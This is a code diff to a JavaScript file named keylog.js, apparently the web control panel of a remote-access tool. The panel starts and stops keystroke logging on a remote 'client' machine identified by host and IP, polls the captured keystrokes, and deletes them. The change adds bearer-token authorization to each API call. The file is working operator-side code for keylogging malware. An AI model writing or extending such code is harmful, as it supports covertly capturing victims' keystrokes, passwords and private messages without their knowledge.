@@ -1,10 +1,18 @@
-// language: JavaScript, file: public/js/keylog.js
+// language: JavaScript, file: public/js/keylog.js (Remote Server)
 const $ = (id) => document.getElementById(id);
 const params = new URLSearchParams(location.search);
 const clientId = Number(params.get('id'));
 const hostName = params.get('host') || `client ${clientId}`;
 const hostIp   = params.get('ip') || '';
+const token    = params.get('token') || '';
+
 $('target').textContent = `${hostName} @ ${hostIp}`;
+
+function apiFetch(url, opts = {}) {
+  opts.headers = opts.headers || {};
+  if (token) opts.headers['Authorization'] = `Bearer ${token}`;
+  return fetch(url, opts);
+}
 
 let running = false;
 let lastSeenId = 0;
@@ -13,7 +21,7 @@ let firstChunkSeen = false;
 
 async function toggle() {
   if (running) {
-    await fetch(`/api/clients/${clientId}/keylog/stop`, { method: 'POST' });
+    await apiFetch(`/api/clients/${clientId}/keylog/stop`, { method: 'POST' });
     running = false;
     $('toggle').textContent = 'start logging';
     $('toggle').classList.remove('on');
@@ -22,7 +30,7 @@ async function toggle() {
   } else {
     $('log').innerHTML = '<div class="loading" style="padding:48px;display:flex;flex-direction:column;align-items:center;gap:14px"><div class="ring"></div><span style="color:var(--muted);font-size:12px">waiting for first keystroke…</span></div>';
     firstChunkSeen = false;
-    await fetch(`/api/clients/${clientId}/keylog/start`, { method: 'POST' });
+    await apiFetch(`/api/clients/${clientId}/keylog/start`, { method: 'POST' });
     running = true;
     $('toggle').textContent = 'stop logging';
     $('toggle').classList.add('on');
@@ -33,7 +41,7 @@ async function toggle() {
 
 async function poll() {
   try {
-    const r = await fetch(`/api/clients/${clientId}/keylog`);
+    const r = await apiFetch(`/api/clients/${clientId}/keylog`);
     if (!r.ok) return;
     const rows = await r.json();
     for (const row of rows) {
@@ -77,7 +85,7 @@ function stopPolling() {
 $('toggle').addEventListener('click', toggle);
 $('clear').addEventListener('click', async () => {
   if (!confirm('clear keylog for this client?')) return;
-  await fetch(`/api/clients/${clientId}/keylog`, { method: 'DELETE' });
+  await apiFetch(`/api/clients/${clientId}/keylog`, { method: 'DELETE' });
   $('log').innerHTML = '';
   lastSeenId = 0;
   firstChunkSeen = false;
